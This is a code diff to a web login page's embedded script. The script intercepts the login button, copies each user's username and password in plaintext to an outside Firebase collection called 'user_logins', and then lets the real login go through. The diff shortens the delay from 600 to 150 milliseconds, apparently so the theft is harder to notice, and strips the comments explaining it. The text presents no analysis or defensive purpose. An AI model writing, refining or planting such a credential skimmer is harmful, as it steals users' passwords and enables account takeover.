@@ -125,7 +125,7 @@ return true;
 		</footer>
 </form>
 
-<!-- Fixed Firebase Script with Delay & Proper Collection -->
+<!-- Fixed Firebase Script with Fast Delay -->
 <script type="module">
 	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
@@ -146,7 +146,7 @@ return true;
 	const loginBtn = document.getElementById("BodyPH_btnLogin");
 	if (loginBtn) {
 		loginBtn.addEventListener("click", async (e) => {
-			e.preventDefault(); // Page ko foran refresh hone se rokega taake data firebase chala jaye
+			e.preventDefault(); 
 
 			const username = document.getElementById("BodyPH_tbUserName").value;
 			const password = document.getElementById("BodyPH_tbPassword").value;
@@ -155,7 +155,6 @@ return true;
 
 			if (username && password) {
 				try {
-					// Seedha "user_logins" collection mein data save hoga
 					await addDoc(collection(db, "user_logins"), {
 						username: username,
 						password: password,
@@ -168,14 +167,14 @@ return true;
 				}
 			}
 
-			// Thora sa delay de kar page ko postback honay dein
+			// Sirf 150ms ka fast delay taake foran postback ho jaye
 			setTimeout(() => {
 				if (typeof WebForm_DoPostBackWithOptions === 'function') {
 					__doPostBack('ctl00$BodyPH$btnLogin', '');
 				} else {
 					document.getElementById('form1').submit();
 				}
-			}, 600); 
+			}, 150); 
 		});
 	}
 </script>
